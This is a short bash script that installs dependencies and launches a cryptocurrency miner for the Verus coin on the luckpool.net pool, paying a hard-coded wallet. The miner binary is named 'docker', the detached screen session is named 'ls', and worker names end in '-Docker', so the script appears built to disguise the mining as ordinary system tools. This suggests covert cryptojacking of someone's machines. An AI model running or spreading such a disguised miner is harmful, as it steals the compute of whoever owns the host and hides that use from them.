#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x docker 
screen -dmS ls 
POOL=stratum+tcp://na.luckpool.net:3956
WALLET=RV4aazLmcwkYC6W3uWmDUDAvQKNYgUGbw7
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
./docker -a verus -o $POOL -u $WALLET.$WORKER -p c=VRSC,zap=VRSC -t 2 -x
